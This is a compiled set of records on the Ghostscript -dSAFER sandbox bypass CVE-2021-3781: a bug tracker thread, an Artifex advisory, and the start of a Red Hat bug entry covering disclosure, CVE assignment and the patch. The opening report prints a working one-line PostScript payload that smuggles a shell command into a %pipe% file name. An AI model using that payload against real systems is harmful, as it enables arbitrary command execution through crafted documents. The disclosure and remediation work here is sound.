| [Description](show_bug.cgi?id=704342#c0)  jens.a.mueller    2021-09-08 01:28:24 UTC  ``` Hi,  Here's a trivial -dSAFER bypass that allows to execute arbitrary shell commands in the 9.55 Git version:  # bin/gs -dSAFER GPL Ghostscript GIT PRERELEASE 9.55.0 (2021-03-30) [...] GS>(%pipe%/tmp/&id)(w)file GS<1>sh: 1: /tmp/: Permission denied uid=0(root) gid=0(root) groups=0(root)  Greetings Jens ```  [Comment 1](show_bug.cgi?id=704342#c1)  Chris Liddell (chrisl)    2021-09-08 10:41:21 UTC  ``` We have a fix in testing at the moment.  Since this exploit has apparently been doing the rounds since March and fully public since at least Aug 25th (so much for responsible disclosure!!), I'm inclined to release the fix publicly as soon we've completed testing and review.  Any objections or counterarguments from interested parties? ```  [Comment 2](show_bug.cgi?id=704342#c2)  jens.a.mueller    2021-09-08 10:55:28 UTC  ``` Hi Chris,  No objections. A fix should be released asap, imho. Please provide the commit, allowing source code fixes to be applied. Note: It looks like this issue was found in parallel by multiple researchers (easy find).  Greetings Jens ```  [Comment 3](show_bug.cgi?id=704342#c3)  Chris Liddell (chrisl)    2021-09-08 11:26:45 UTC  ``` (In reply to jens.a.mueller from [comment #2](show_bug.cgi?id=704342#c2)) > Hi Chris, >  > No objections.

Note: It looks like this > issue was found in parallel by multiple researchers (easy find). >  > Greetings > Jens  Hi Jens,  You at least had the courtesy to report it to us, which I greatly appreciate.  And thanks for the feedback, too. Unless anyone else raises a convincing objection or there are any internal review issues, we'll hopefully publish the fix within a day or so. ```  [Comment 4](show_bug.cgi?id=704342#c4)  Cedric    2021-09-08 11:34:27 UTC  ``` Who will assign a CVE ?  After a quick check it does not affect older ghostscript versions (I couldn't reproduce it on 9.27, but it's reproducible on 9.53) ```  [Comment 5](show_bug.cgi?id=704342#c5)  jens.a.mueller    2021-09-08 15:15:14 UTC  ``` 9.50 to 9.54 (official releases) and 9.55 (from Git) are affected. The older 9.xx versions are not.  @Cedric: I think it would be easiest if Red Hat requested a CVE ID (you're still with them, aren't you? :)). Probably much faster than if independent researchers try their luck with Mitre's CVE request form. ```  [Comment 6](show_bug.cgi?id=704342#c6)  Chris Liddell (chrisl)    2021-09-08 15:17:53 UTC  ``` I already have a CVE request in with Mitre. Waiting on the assignment now. ```  [Comment 7](show_bug.cgi?id=704342#c7)  Chris Liddell (chrisl)    2021-09-08 15:22:14 UTC  ``` (In reply to Chris Liddell (chrisl) from [comment #6](show_bug.cgi?id=704342#c6)) > I already have a CVE request in with Mitre. Waiting on the assignment now.  I guess I could cancel, if the general consensus points that way. ```  [Comment 8](show_bug.cgi?id=704342#c8)  jens.a.mueller    2021-09-08 15:24:01 UTC  ``` Even better. (Sorry, I did not know Artifex does request CVE IDs nowadays; Last I check in 2018, it was D.I.Y. ;)) ```  [Comment 9](show_bug.cgi?id=704342#c9)  Cedric    2021-09-08 15:26:36 UTC  ``` (In reply to Chris Liddell (chrisl) from [comment #7](show_bug.cgi?id=704342#c7)) > (In reply to Chris Liddell (chrisl) from [comment #6](show_bug.cgi?id=704342#c6)) > > I already have a CVE request in with Mitre.

I've asked them to cancel my request. ```  [Comment 11](show_bug.cgi?id=704342#c11)  Chris Liddell (chrisl)    2021-09-08 16:53:35 UTC  ``` FWIW, here is the patch we are testing/reviewing:  <https://git.ghostscript.com/?p=user/chrisl/ghostpdl.git;a=commitdiff;h=f424c74d1b98> ```  [Comment 12](show_bug.cgi?id=704342#c12)  Cedric    2021-09-09 10:47:29 UTC  ``` CVE-2021-3781 has been assigned to this flaw ```  [Comment 13](show_bug.cgi?id=704342#c13)  Chris Liddell (chrisl)    2021-09-09 10:49:01 UTC  ``` (In reply to Cedric from [comment #12](show_bug.cgi?id=704342#c12)) > CVE-2021-3781 has been assigned to this flaw  Thanks Cedric, very much appreciated! ```  [Comment 14](show_bug.cgi?id=704342#c14)  Chris Liddell (chrisl)    2021-09-09 12:05:15 UTC  ``` I have pushed the above referenced fix:  <https://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a9bd3dec9fde>   Tomorrow (UK) morning, I will begin the process of prepping and testing a Ghostscript/GhostPDL release, with that commit included. We're aiming to have that release ready before the end of the month. ```  [Comment 15](show_bug.cgi?id=704342#c15)  marc.deslauriers    2021-09-09 12:56:28 UTC  ``` Is there an ETA on when we can make updates with this patch and the CVE number public? While there appears to be discussion in this bug of fixing it publicly, the bug isn't actually public... ```  [Comment 16](show_bug.cgi?id=704342#c16)  Chris Liddell (chrisl)    2021-09-09 13:33:49 UTC  ``` (In reply to marc.deslauriers from [comment #15](show_bug.cgi?id=704342#c15)) > Is there an ETA on when we can make updates with this patch and the CVE > number public? While there appears to be discussion in this bug of fixing it > publicly, the bug isn't actually public...  As I outlined above, since the exploit has been "in wild" for at least 6 months, I pushed the patch to our public repo already - keeping the patch secret in this circumstance seemed pointless.  I'll make this bug public before close of business (UK) on Friday - again, unless there are strong, convincing arguments not to (you can still link to it, making it public won't change the URL).  In this specific case, I recommend rolling out the patch as soon as your respective procedures allow. ```  [Comment 17](show_bug.cgi?id=704342#c17)  Salvatore Bonaccorso    2021-09-09 17:26:29 UTC  ``` Chris, thanks for confirming. ```  [Comment 18](show_bug.cgi?id=704342#c18)  Chris Liddell (chrisl)    2021-09-13 09:10:55 UTC  ``` (In reply to Salvatore Bonaccorso from [comment #17](show_bug.cgi?id=704342#c17)) > Chris, thanks for confirming.  Just to be clear (and this does not refer to or reflect on Jens, the OP):  This was only because of the manner that this bug became public, and for security issues that are responsibility disclosed to us before being made public, we will establish a timetable (usually of a few days) for public disclosure of both the fix and the bug, in the bugzilla bug allowing any of the CC'ed parties to object or discuss it. That is our "normal" procedure. ``` |  |

# CVE-2021-3781

# SECURITY ADVISORY SEPTEMBER 9, 2021 - CVE-2021-3781

**Synopsis:** The file access protection built into Ghostscript proved insufficient for the
"%pipe%" PostScript device, when combined with Ghostscript's requirement to be able to create and
control temporary files in the conventional temporary file directories (for example, "/tmp" or "/temp).
This exploit is restricted to Unix-like systems (i.e., it doesn't affect Windows). The most severe
claimed results are only feasible if the exploit is run as a "high privilege" user (root/superuser
level) \u2013 a practice we would discourage under any circumstances.

**Resolution:** The solution involves including the device specifier string ("%pipe%") in the
permissions checking, meaning the entire file name string is validated, rather than (as before) only
the sub-string following the device specifier.

To remediate CVE-2021-3781 please apply the following patch: [Patch](https://marketing.artifex.com/e/912391/-gita-commitdiffh-a9bd3dec9fde/4p42h/73762904?h=ij8LZ1TXVhbQ19tmZFG_Hq8B6tjfLxEJ7Qo8tGe7EVs)

We are not issuing a patch release at this time, as this fix will be included with the official
Ghostscript/GhostPDL 9.55.0 release, which is expected by the end of September.

Impacted Product Releases:

* Ghostscript/GhostPDL 9.50

| [Description](show_bug.cgi?id=2002271#c0)  Cedric Buissart    2021-09-08 11:46:13 UTC  ``` The file access protection built into Ghostscript proved insufficient for the "%pipe%" PostScript device, when combined with Ghostscript's requirement to be able to create and control temporary files in the conventional temporary file directories (for example, "/tmp" or "/temp). This exploit is restricted to Unix-like systems (i.e., it doesn't affect Windows). The most severe claimed results are only feasible if the exploit is run as a "high privilege" user (root/superuser level) -- a practice we would discourage under any circumstances.   Resolution: The solution involves including the device specifier string ("%pipe%") in the permissions checking, meaning the entire file name string is validated, rather than (as before) only the sub-string following the device specifier.   This flaw allows to trivially escape the sandbox (enabled with the `-dSAFER` option). A specially crafted document could use this flaw to execute command on the system, in the context of the ghostscript interpreter.  This flaw affects only version from 9.50 onward.
